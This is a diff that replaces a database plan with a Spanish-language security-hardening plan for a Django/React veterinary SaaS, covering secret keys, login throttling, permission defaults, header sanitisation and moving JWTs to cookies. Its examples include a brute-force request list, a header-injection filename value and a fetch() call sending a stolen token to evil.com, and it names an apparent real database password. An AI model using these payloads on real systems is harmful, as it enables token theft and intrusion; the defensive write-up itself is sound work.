@@ -1,292 +1,466 @@
-Plan de corrección de base de datos — VetCare SaaS
+Detalle completo de todas las tareas
+
+  ---
+  T1 — SECRET_KEY + variables de producción
+
+  El problema:
+  Tu SECRET_KEY actual empieza con django-insecure-. Django usa esta clave para firmar todas las cookies de sesión,
+  tokens CSRF y cualquier dato serializado con signing.dumps(). Si alguien la conoce, puede forjar tokens. La clave de
+  dev vive en .env (que nunca se sube), pero en producción necesitas una diferente y fuerte.
+
+  La solución:
+  No se toca el .env local. En el servidor de producción, seteas las variables directamente en la plataforma (Railway →
+  Variables, Render → Environment, VPS → /etc/environment o systemd unit). Tu settings.py ya usa decouple.config() así
+  que lee de entorno sin cambios.
+
+  Qué hacer:
+  # 1. Genera la clave (solo para copiarla al panel de producción)
+  python -c "from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())"
+
+  # Output ejemplo:
+  # w$k7@2xp!mn#q8...  (50 chars aleatorios)
+
+  # 2. Variables que necesitas setear en producción:
+  SECRET_KEY=<la clave generada arriba>
+  DEBUG=False
+  ALLOWED_HOSTS=tudominio.com,www.tudominio.com
+  DB_NAME=veterinaria_prod
+  DB_USER=postgres_prod
+  DB_PASSWORD=<contraseña nueva, diferente a Caimanes23>
+  DB_HOST=<host del servidor de BD>
+  DB_PORT=5432
+
+  También hay que actualizar .env.example para documentar que ALLOWED_HOSTS y CORS_ALLOWED_ORIGINS son obligatorios en
+  producción — actualmente no aparecen en el ejemplo.
+
+  ---
+  T2 — Eliminar /api/employees/ legacy
+
+  El problema:
+  CreateEmployeeView crea el serializer sin pasar context={'request': request}:
+
+  # views.py:38 — el bug
+  def post(self, request):
+      serializer = CreateEmployeeSerializer(data=request.data)  # sin context
+      # → request.context.get('request') devuelve None
+      # → organization = None
+      # → usuario creado sin organización
+
+  Un usuario sin organización es un estado incoherente: el TenantManager le devuelve querysets vacíos pero el usuario
+  existe en la DB fuera de cualquier tenant. Si ese usuario logra un JWT válido, su comportamiento es impredecible.
+
+  La solución:
+  Simplemente remover la ruta. El endpoint correcto ya existe y funciona bien:
+
+  # config/urls.py — ANTES
+  path('api/employees/', CreateEmployeeView.as_view()),  # ← eliminar esta línea
+  path('api/staff/', StaffListView.as_view(), name='staff-list'),
+  path('api/staff/create/', StaffCreateView.as_view(), name='staff-create'),
+
+  # config/urls.py — DESPUÉS
+  # (sin la línea de /api/employees/)
+  path('api/staff/', StaffListView.as_view(), name='staff-list'),
+  path('api/staff/create/', StaffCreateView.as_view(), name='staff-create'),
+
+  También se puede eliminar CreateEmployeeView de views.py y su import en urls.py.
+
+  ---
+  T3 — Rate limiting en login
+
+  El problema:
+  /api/token/ no tiene ningún límite de intentos. Un atacante puede automatizar miles de combinaciones por segundo:
+  POST /api/token/ {"username": "admin", "password": "123456"}
+  POST /api/token/ {"username": "admin", "password": "password"}
+  POST /api/token/ {"username": "admin", "password": "Caimanes23"}
+  ...
+  Django REST Framework incluye throttling nativo, solo hay que activarlo.
+
+  La solución:
+
+  # settings.py — agregar dentro de REST_FRAMEWORK
+  REST_FRAMEWORK = {
+      'DEFAULT_AUTHENTICATION_CLASSES': (
+          'apps.core.authentication.TenantJWTAuthentication',
+      ),
+      # AGREGAR:
+      'DEFAULT_THROTTLE_CLASSES': [
+          'rest_framework.throttling.AnonRateThrottle',
+          'rest_framework.throttling.UserRateThrottle',
+      ],
+      'DEFAULT_THROTTLE_RATES': {
+          'anon': '10/min',   # 10 intentos/min para no autenticados
+          'user': '60/min',   # 60 requests/min para autenticados
+          'login': '5/min',   # throttle específico para el login
+      },
+  }
+
+  # apps/users/throttles.py — archivo nuevo (5 líneas)
+  from rest_framework.throttling import AnonRateThrottle
+
+  class LoginRateThrottle(AnonRateThrottle):
+      scope = 'login'
 
-Ajustado para PostgreSQL · Sin datos reales en producción · Enfoque SaaS escalable
+  # config/urls.py — aplicar throttle al endpoint de token
+  from rest_framework_simplejwt.views import TokenObtainPairView
+  from apps.users.throttles import LoginRateThrottle
+  from rest_framework.decorators import throttle_classes
 
-Contexto del problema
+  # Crear vista custom con throttle
+  class ThrottledTokenObtainPairView(TokenObtainPairView):
+      throttle_classes = [LoginRateThrottle]
 
-El modelo actual tiene una base correcta en términos de entidades y relaciones, pero carece de mecanismos estructurales fuertes que garanticen la integridad de los datos en un entorno multitenant. Actualmente, la coherencia entre organizaciones depende en gran medida de validaciones en la capa de aplicación, lo cual introduce riesgos importantes: un bug, una validación omitida o una operación directa sobre el ORM puede generar mezcla de datos entre clínicas.
+  # En urlpatterns reemplazar:
+  path('api/token/', ThrottledTokenObtainPairView.as_view()),
 
-Adicionalmente, existen riesgos en la gestión de datos históricos debido al uso de CASCADE en relaciones críticas, ausencia de constraints de negocio a nivel base de datos, y falta de una estrategia global de auditoría, aislamiento y eliminación lógica.
+  Con esto, después de 5 intentos fallidos en 1 minuto la IP recibe HTTP 429 Too Many Requests.
 
-La meta de este plan no es solo corregir errores actuales, sino establecer una base sólida para un SaaS que pueda escalar sin comprometer integridad, trazabilidad ni mantenibilidad.
+  ---
+  T4 — Corregir permiso implícito cuando required=None
 
-Paso 0 — Verificación inicial y baseline técnico
+  El problema:
+  Si una vista no define resource_name, basename ni required_permission, el sistema de permisos permite el acceso en
+  silencio:
 
-Por qué va primero: antes de introducir constraints, índices o cambios en relaciones, es necesario asegurar que el entorno de base de datos está correctamente configurado para soportar las capacidades avanzadas que se van a utilizar.
+  # permissions.py:122-123
+  if required is None:
+      return True  # ← cualquier usuario autenticado entra
 
-Qué verificar:
+  El comentario dice "comportamiento conservador durante la migración" — eso fue válido durante el desarrollo, pero en
+  producción es un fallo abierto. Si en el futuro alguien agrega una vista y olvida definir el recurso, automáticamente
+  es accesible para todos.
 
-Confirmar uso de PostgreSQL (versión recomendada 13+).
-Verificar que el encoding sea UTF8.
-Confirmar timezone consistente (idealmente UTC en DB).
-Revisar que no existan datos seed que violen futuras constraints.
-Confirmar que el ORM está alineado con la DB (sin drift entre migrations y schema real).
+  La solución:
+  Cambiar a return False y auditar que ninguna vista activa tenga required=None:
 
-Resultado esperado: entorno listo para aplicar constraints reales sin comportamientos inesperados.
+  # permissions.py — ANTES
+  if required is None:
+      return True
 
-Tiempo estimado: 1–2 horas.
+  # permissions.py — DESPUÉS
+  if required is None:
+      logger.error(
+          "Vista sin resource_name/required_permission: %s %s — acceso DENEGADO",
+          request.method, request.path,
+      )
+      return False
 
-Paso 1 — Corrección de comportamientos de borrado en datos históricos
+  Antes de hacer este cambio, hay que verificar que todas las vistas activas tienen su recurso definido. Las vistas que
+  usan make_permission("codigo") ya están cubiertas. Las vistas con ModelViewSet y basename también. Hay que revisar
+  especialmente cualquier APIView custom sin resource_name.
+
+  ---
+  T5 — Sanitizar Content-Disposition del PDF
+
+  El problema:
+  El header HTTP se construye con datos de usuario sin escapar:
+
+  # prescriptions/views.py:181
+  response['Content-Disposition'] = (
+      f'attachment; filename="receta_{prescription.id}_{pet.name}.pdf"'
+  )
 
-Por qué es crítico: el uso de CASCADE en entidades clínicas o fiscales puede provocar pérdida irreversible de información. En un SaaS médico, esto no es aceptable ni técnica ni legalmente.
+  Si pet.name = 'Firulais"; filename="virus.exe', el header resultante es:
+  Content-Disposition: attachment; filename="receta_42_Firulais"; filename="virus.exe"
+  Algunos browsers y proxies interpretan el segundo filename= como el real. En casos más extremos con \r\n se pueden
+  inyectar headers adicionales completos.
+
+  La solución:
 
-Qué cambiar y por qué:
+  # prescriptions/views.py — reemplazar las líneas 181-183
+  import re
 
-Appointment.veterinarian → SET_NULL
-La cita debe permanecer aunque el veterinario ya no esté activo.
-MedicalRecord.veterinarian → SET_NULL
-El historial clínico es permanente.
-Prescription.veterinarian → SET_NULL
-Una prescripción no puede desaparecer.
-Invoice.owner → PROTECT
-No se puede eliminar un propietario con facturas.
-Invoice.pet → PROTECT
-Las facturas deben permanecer incluso si la mascota se elimina del sistema lógico.
-Invoice.appointment → PROTECT
-No se puede eliminar una cita con impacto financiero.
+  safe_name = re.sub(r'[^\w\s\-]', '', pet.name)[:50]  # solo alfanumérico, guion, espacio
+  response['Content-Disposition'] = (
+      f'attachment; filename="receta_{prescription.id}_{safe_name}.pdf"'
+  )
 
-Regla general:
-
-Historia clínica → SET_NULL
-Datos financieros → PROTECT
-Detalles dependientes (ej. items) → CASCADE controlado
-
-Tiempo estimado: medio día (sin datos reales simplifica todo).
-
-Paso 2 — Tenant enforcement estructural (nuevo paso crítico)
-
-Por qué es necesario: actualmente el aislamiento multitenant depende de filtros manuales. Esto no es suficiente en un SaaS. Se requiere un mecanismo estructural que reduzca al mínimo el riesgo de fuga de datos.
-
-Estrategia en tres capas:
-
-Capa 1 — OrganizationalModel consistente
-
-Todos los modelos deben heredar de una base común con:
-
-organization = ForeignKey(Organization)
-
-Esto debe ser obligatorio en todas las entidades, incluyendo:
-
-InvoiceItem
-PrescriptionItem
-MedicalRecordProduct
-
-Eliminar modelos sin organization propio.
-
-Capa 2 — Enforcement en ORM (automático)
-
-Implementar:
-
-Custom Manager / QuerySet que filtre automáticamente por organization.
-Middleware o contexto que inyecte organization actual.
-
-Ejemplo conceptual:
-
-objects = TenantManager()
-
-Esto reduce errores humanos en queries.
-
-Capa 3 — Validación fuerte en modelo
-Validaciones en clean()
-Override de save() llamando full_clean()
-
-Esto asegura que ninguna operación (API, admin, shell) pueda violar el tenant.
-
-Capa 4 — Refuerzo en DB (PostgreSQL)
-
-Cuando sea crítico (ej. facturación):
-
-Constraints con SQL personalizado
-Posible uso futuro de Row-Level Security (RLS)
-
-Nota: Django no soporta bien constraints multitabla, pero PostgreSQL sí permite soluciones avanzadas si se requieren.
-
-Tiempo estimado: 1.5–2 días.
-
-Paso 3 — Constraints de coherencia multitenant entre FKs
-
-Por qué sigue siendo necesario: aunque exista enforcement general, las relaciones específicas entre modelos deben validarse explícitamente.
-
-Qué validar por modelo:
-
-Pet → owner debe pertenecer a misma organization.
-Appointment → pet y veterinarian deben coincidir en organization.
-MedicalRecord → pet, veterinarian y appointment deben coincidir.
-Invoice → owner, pet, appointment y medical_record deben ser coherentes.
-InvoiceItem → referencias deben pertenecer a organization de la factura.
-
-Dónde implementar:
-
-Model.clean()
-Serializer
-Tests explícitos de cross-tenant
-
-Adicional en PostgreSQL:
-
-Se pueden agregar constraints SQL avanzadas donde aplique.
-
-Tiempo estimado: 1–1.5 días.
-
-Paso 4 — CheckConstraints de valores y rangos (DB-first)
-
-Por qué en base de datos: PostgreSQL sí aplica estas constraints de forma estricta y eficiente. Esto elimina completamente estados inválidos.
-
-Qué agregar:
-
-En InvoiceItem:
-
-quantity > 0
-unit_price >= 0
-subtotal >= 0
-
-En Invoice:
-
-tax_rate entre 0 y 1
-total >= subtotal
-subtotal >= 0
-
-En Product/Presentation:
-
-stock >= 0
-price > 0
-
-En Appointment:
-
-end_time > start_time
-
-En PrescriptionItem:
-
-quantity > 0
-
-Implementación:
-
-Django CheckConstraint
-o RunSQL si se requiere más control
-
-Tiempo estimado: medio día.
-
-Paso 5 — Regla XOR en InvoiceItem
-
-Por qué es crítica: elimina ambigüedad en el tipo de línea y evita errores en inventario y facturación.
-
-Regla:
-
-exactamente uno de:
-service
-presentation
-
-Implementación en PostgreSQL:
-
-CHECK (
-  (service_id IS NOT NULL)::int +
-  (presentation_id IS NOT NULL)::int = 1
-)
-
-En Django:
-
-CheckConstraint o RunSQL
-
-Dependencia:
-
-ejecutar después de migración de product → presentation
-
-Tiempo estimado: 2–3 horas.
-
-Paso 6 — Auditoría (nuevo)
-
-Por qué es necesaria: en un SaaS necesitas trazabilidad completa.
-
-Qué agregar en base model:
-
-created_at
-updated_at
-created_by
-updated_by
-
-Opcional:
-
-audit logs (tabla separada)
-
-Esto permite:
-
-debugging real
-soporte a clientes
-cumplimiento futuro
-
-Tiempo estimado: medio día.
-
-Paso 7 — Estrategia de eliminación lógica (soft delete)
-
-Por qué: en SaaS casi nunca se elimina físicamente información crítica.
-
-Qué implementar:
-
-is_active = BooleanField(default=True)
-
-O:
-
-deleted_at = DateTimeField(null=True)
-
-Aplicar a:
-
-pets
-owners
-staff
-productos
-
-No aplicar a:
-
-logs históricos
-facturación cerrada
-
-Esto evita pérdida de información y simplifica integridad.
-
-Tiempo estimado: medio día.
-
-Paso 8 — Índices compuestos
-
-Por qué al final: dependen de cómo quedan los modelos después de las correcciones.
-
-Qué agregar:
-
-Appointment → (organization, date, status)
-Invoice → (organization, status, created_at)
-MedicalRecord → (organization, pet_id, date)
-Pet → (organization, owner_id)
-Staff → (organization, role, is_active)
-
-Adicional importante:
-
-(organization, id) implícito para joins eficientes
-
-En PostgreSQL:
-
-usar CREATE INDEX (no concurrente necesario aún)
-
-Tiempo estimado: medio día.
-
-Relación con arquitectura ORM + SQL
-
-Este plan asume una estrategia híbrida:
-
-ORM (Django) para:
-modelado
-validaciones de negocio
-CRUD
-SQL (PostgreSQL) para:
-constraints críticas
-optimización
-enforcement estructural
-
-Esto permite velocidad de desarrollo sin sacrificar integridad.
-
-Orden de ejecución final
-Paso 0 — Verificación
-Paso 1 — Borrados
-Paso 2 — Tenant enforcement global
-Paso 3 — Coherencia multitenant
-Paso 4 — CheckConstraints
-Paso 5 — XOR InvoiceItem
-Paso 6 — Auditoría
-Paso 7 — Soft delete
-Paso 8 — Índices
+  Alternativamente, RFC 5987 permite encoding explícito:
+  from urllib.parse import quote
+  encoded = quote(pet.name, safe='')
+  response['Content-Disposition'] = (
+      f"attachment; filename*=UTF-8''{encoded}.pdf"
+  )
+
+  ---
+  T6 — RBAC en dashboard_stats
+
+  El problema:
+  El endpoint más rico en información de la app tiene la protección más débil:
+
+  # dashboard/views.py:8
+  @permission_classes([IsAuthenticated])  # cualquier rol entra
+  def dashboard_stats(request):
+      # Devuelve: citas de hoy, 5 últimos historiales clínicos con diagnósticos,
+      # productos con stock bajo, estadísticas generales
+
+  Un ASSISTANT puede ver diagnósticos médicos completos del historial reciente aunque no tenga permiso de
+  medicalrecord.retrieve.
+
+  La solución:
+
+  # dashboard/views.py
+  from apps.core.permissions import make_permission
+
+  @api_view(['GET'])
+  @permission_classes([make_permission("dashboard.view")])  # o reutilizar "appointment.list"
+  def dashboard_stats(request):
+      ...
+
+  Si no se quiere crear un nuevo código de permiso, la opción más simple es reutilizar
+  make_permission("appointment.list") ya que todos los roles que deben ver el dashboard tienen ese permiso. Si se crea
+  dashboard.view, hay que agregarlo a PERMISSION_CODES y al dict PERMISSIONS para todos los roles relevantes.
+
+  ---
+  T7 — Headers de seguridad HTTP
+
+  El problema:
+  Sin estos headers, el browser no aplica protecciones adicionales. Con DEBUG=False en producción, Django los ignora si
+  no están configurados.
+
+  La solución — agregar al final de settings.py:
+
+  # settings.py — solo activo cuando DEBUG=False (producción)
+  if not DEBUG:
+      # Fuerza HTTPS — redirige HTTP → HTTPS
+      SECURE_SSL_REDIRECT = True
+
+      # HSTS: le dice al browser que SIEMPRE use HTTPS para este dominio
+      # 1 año (31536000 segundos). Empezar con 3600 y subir gradualmente
+      SECURE_HSTS_SECONDS = 3600
+      SECURE_HSTS_INCLUDE_SUBDOMAINS = True
+
+      # Cookies solo por HTTPS
+      SESSION_COOKIE_SECURE = True
+      CSRF_COOKIE_SECURE = True
+
+      # Evita que browsers "adivinen" el content-type
+      SECURE_CONTENT_TYPE_NOSNIFF = True
+
+      # No permite que la app se cargue en un iframe (clickjacking)
+      X_FRAME_OPTIONS = 'DENY'
+
+  CORS en producción — actualmente solo tiene localhost:
+  # settings.py — reemplazar la sección CORS
+  if DEBUG:
+      CORS_ALLOWED_ORIGINS = [
+          'http://localhost:5173',
+          'http://127.0.0.1:5173',
+      ]
+  else:
+      CORS_ALLOWED_ORIGINS = config(
+          'CORS_ALLOWED_ORIGINS',
+          cast=lambda v: [s.strip() for s in v.split(',')]
+      )
+
+  Así en producción seteas CORS_ALLOWED_ORIGINS=https://tudominio.com como variable de entorno.
+
+  ---
+  T8 — Migrar JWT de localStorage a cookies httpOnly
+
+  El problema:
+  localStorage es legible por cualquier JavaScript. Si hay un XSS en cualquier campo de texto libre (nombre de mascota,
+  diagnóstico, notas de prescripción), el atacante ejecuta:
+
+  fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'))
+  // → roba el token y el refresh (7 días de acceso)
+
+  Las cookies httpOnly no son accesibles por JavaScript — solo el browser las envía automáticamente con cada request.
+
+  La solución requiere cambios en ambos lados:
+
+  Backend:
+  # apps/users/views.py — nueva vista de login que devuelve cookies
+  from rest_framework_simplejwt.views import TokenObtainPairView
+  from django.middleware.csrf import get_token
+
+  class CookieTokenObtainPairView(TokenObtainPairView):
+      def post(self, request, *args, **kwargs):
+          response = super().post(request, *args, **kwargs)
+          if response.status_code == 200:
+              access = response.data.pop('access')
+              refresh = response.data.pop('refresh')
+              # Setear cookies httpOnly
+              response.set_cookie(
+                  'access_token', access,
+                  httponly=True, secure=not settings.DEBUG,
+                  samesite='Lax', max_age=60*30  # 30 min
+              )
+              response.set_cookie(
+                  'refresh_token', refresh,
+                  httponly=True, secure=not settings.DEBUG,
+                  samesite='Lax', max_age=60*60*24*7  # 7 días
+              )
+          return response
+
+  # TenantJWTAuthentication — leer token de cookie además de header
+  class TenantJWTAuthentication(JWTAuthentication):
+      def authenticate(self, request):
+          # Primero intenta header Authorization (compatibilidad)
+          header = self.get_header(request)
+          if header is None:
+              # Fallback: cookie httpOnly
+              raw_token = request.COOKIES.get('access_token')
+              if raw_token is None:
+                  return None
+              validated_token = self.get_validated_token(raw_token)
+              user = self.get_user(validated_token)
+              set_current_user(user)
+              set_current_org(getattr(user, 'organization', None))
+              return (user, validated_token)
+          return super().authenticate(request)
+
+  Frontend:
+  // api/client.js — eliminar todo lo relacionado a localStorage para tokens
+  // axios envía las cookies automáticamente con withCredentials: true
+  const api = axios.create({
+      baseURL: import.meta.env.VITE_API_URL,
+      withCredentials: true,  // ← envía cookies en cada request
+  });
+
+  // Ya no necesita el interceptor de request para añadir Authorization header
+  // El interceptor de respuesta para logout sigue igual
+
+  // auth/authContext.jsx — eliminar localStorage para tokens
+  const login = () => {
+      // Ya no recibe tokens — la cookie la seteó el backend
+      // Solo actualizar el estado de React
+      setToken(true);  // flag de "hay sesión activa"
+  };
+
+  Nota: Este es el cambio más grande y requiere también ajustar CSRF para que funcione con cookies. Se hace después de
+  T9.
+
+  ---
+  T9 — Refresh automático de token en el frontend
+
+  El problema:
+  refreshTokenRequest() existe en login.js pero nunca se llama. Cuando el access token expira (30 min), el interceptor
+  actual simplemente borra todo y redirige al login:
+
+  // client.js:18-23 — comportamiento actual
+  if (error.response?.status === 401) {
+      localStorage.removeItem("access_token");
+      localStorage.removeItem("refresh_token");
+      localStorage.removeItem("user");
+      window.location.href = "/login";  // ← cierra sesión inmediatamente
+  }
+
+  El usuario pierde lo que estaba haciendo cada 30 minutos.
+
+  La solución:
+
+  // api/client.js — interceptor mejorado
+  import { refreshTokenRequest } from '../auth/login';
+
+  let isRefreshing = false;
+  let failedQueue = [];  // requests que fallaron mientras se refrescaba
+
+  const processQueue = (error, token = null) => {
+      failedQueue.forEach(prom => {
+          if (error) prom.reject(error);
+          else prom.resolve(token);
+      });
+      failedQueue = [];
+  };
+
+  api.interceptors.response.use(
+      (response) => response,
+      async (error) => {
+          const originalRequest = error.config;
+
+          if (error.response?.status === 401 && !originalRequest._retry) {
+              if (isRefreshing) {
+                  // Encolar requests que llegan mientras se refresca
+                  return new Promise((resolve, reject) => {
+                      failedQueue.push({ resolve, reject });
+                  }).then(token => {
+                      originalRequest.headers.Authorization = `Bearer ${token}`;
+                      return api(originalRequest);
+                  });
+              }
+
+              originalRequest._retry = true;
+              isRefreshing = true;
+
+              const refreshToken = localStorage.getItem('refresh_token');
+
+              try {
+                  const { access } = await refreshTokenRequest(refreshToken);
+                  localStorage.setItem('access_token', access);
+                  api.defaults.headers.common['Authorization'] = `Bearer ${access}`;
+                  processQueue(null, access);
+                  originalRequest.headers.Authorization = `Bearer ${access}`;
+                  return api(originalRequest);
+              } catch (refreshError) {
+                  // Refresh falló (token expirado o inválido) → logout real
+                  processQueue(refreshError, null);
+                  localStorage.clear();
+                  window.location.href = '/login';
+                  return Promise.reject(refreshError);
+              } finally {
+                  isRefreshing = false;
+              }
+          }
+
+          if (error.response?.status >= 500) {
+              alert("Error del servidor. Intenta más tarde.");
+          }
+
+          return Promise.reject(error);
+      }
+  );
+
+  La cola (failedQueue) evita que si 3 requests fallan simultáneamente al expirar el token, se hagan 3 refreshes — solo
+  se hace 1 y los otros 2 esperan.
+
+  ---
+  T10 — PrivateRoute valida token + user
+
+  El problema:
+  La guarda de rutas privadas solo chequea user (que viene de localStorage):
+
+  // privateRoutes.jsx:6-8
+  if (!initializing && !user) {
+      return <Navigate to="/login" replace />;
+  }
+
+  Si alguien borra el access_token de localStorage pero deja el objeto user, la guarda lo deja pasar. Los requests al
+  backend fallarán porque no hay token, pero el usuario ve la UI con datos potencialmente cacheados en el estado de
+  React.
+
+  La solución:
+
+  // privateRoutes.jsx
+  const PrivateRoute = ({ children }) => {
+      const { token, user, initializing } = useAuth();
+
+      if (initializing) return null;  // esperar hidratación
+
+      if (!user || !token) {
+          return <Navigate to="/login" replace />;
+      }
+
+      return children;
+  };
+
+  Pequeño pero importante: también hay que manejar el estado initializing explícitamente para no flashear el login
+  mientras se carga localStorage.
+
+  ---
+  Resumen visual
+
+  FASE 1 — Fixes inmediatos (cada uno < 10 líneas)
+  ├── T2: Borrar /api/employees/          → config/urls.py
+  ├── T5: Sanitizar PDF filename          → prescriptions/views.py
+  ├── T6: RBAC en dashboard               → dashboard/views.py
+  └── T10: PrivateRoute valida token      → privateRoutes.jsx
+
+  FASE 2 — Configuración (settings y permisos)
+  ├── T1: SECRET_KEY prod + .env.example  → settings.py + .env.example
+  ├── T3: Rate limiting login             → settings.py + throttles.py nuevo
+  ├── T4: required=None → denegar         → core/permissions.py
+  └── T7: Headers HTTP producción         → settings.py
+
+  FASE 3 — Auth (mayor impacto)
+  ├── T9: Refresh automático de token     → api/client.js
+  └── T8: JWT → cookies httpOnly          → back + front (requiere T9 primero)
